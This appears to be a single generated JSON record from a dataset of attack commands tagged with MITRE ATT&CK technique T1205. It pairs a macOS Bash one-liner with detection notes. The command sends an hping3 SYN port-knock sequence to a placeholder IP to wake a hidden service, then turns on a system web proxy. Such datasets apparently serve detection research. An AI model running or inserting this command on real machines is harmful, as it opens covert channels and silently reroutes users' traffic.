@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo hping3 -S -c 1 -p 22221 203.0.113.10 && sleep 1 && sudo hping3 -S -c 1 -p 22222 203.0.113.10 && sleep 1 && sudo hping3 -S -c 1 -p 22223 203.0.113.10 && networksetup -setwebproxy \"Wi-Fi\" 127.0.0.1 3128 && networksetup -setwebproxystate \"Wi-Fi\" on",
+  "explanation": "Crafts a three-step TCP SYN knock with hping3 to activate a hidden service, then enables an HTTP proxy to a local port. Requires sudo to send raw packets. Detection: monitor raw packet crafting tools and sequences of single SYNs to specific high ports.",
+  "rationale_steps": [
+    "Send a precise SYN knock sequence with raw packets to ports 22221, 22222, 22223.",
+    "Trigger the remote listener to open or reconfigure a service.",
+    "Enable a local HTTP proxy to route traffic post-activation.",
+    "Detect by auditing hping3 invocations and port-knock patterns in outbound traffic."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-d65eb033-a03e4ad9",
+  "source_prompt_hash": "d65eb033",
+  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
